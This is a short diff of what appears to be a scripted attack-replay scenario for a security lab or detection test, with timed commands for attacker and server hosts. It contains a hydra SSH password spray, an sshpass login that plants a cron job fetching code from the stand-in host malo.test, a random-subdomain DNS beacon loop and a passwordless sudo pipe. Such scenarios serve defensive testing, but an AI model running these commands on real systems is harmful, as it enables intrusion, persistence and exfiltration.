@@ -16,7 +16,7 @@
 40|srv-ssh|su - mgarcia -c 'echo Cambi4Esto!2026 | sudo -S -p sudo: id'
 40|replay|password-spray
 30|attacker|hydra -t 4 -l soporte -P /root/wordlists/passwords.txt ssh://172.30.10.11
-20|attacker|sshpass -p sunshine ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null soporte@172.30.10.11 'id; uname -a; sudo -n true; echo \*/5 \* \* \* \* curl -s http://malo.test/c > /tmp/.c; crontab /tmp/.c; rm -f /tmp/.c'
+20|attacker|sshpass -p sunshine ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null soporte@172.30.10.11 'id; uname -a; echo sunshine | sudo -S -p x true; echo \*/5 \* \* \* \* curl -s http://malo.test/c > /tmp/.c; crontab /tmp/.c; rm -f /tmp/.c'
 30|replay|admin-group
 30|attacker|for i in $(seq 1 40); do dig +short +tries=1 +time=1 $(head -c 30 /dev/urandom | od -An -tx1 | tr -d ' \n').malo.test >/dev/null; done
 30|srv-ssh|id practicas >/dev/null 2>&1 || useradd -m -c CHG-2042 practicas
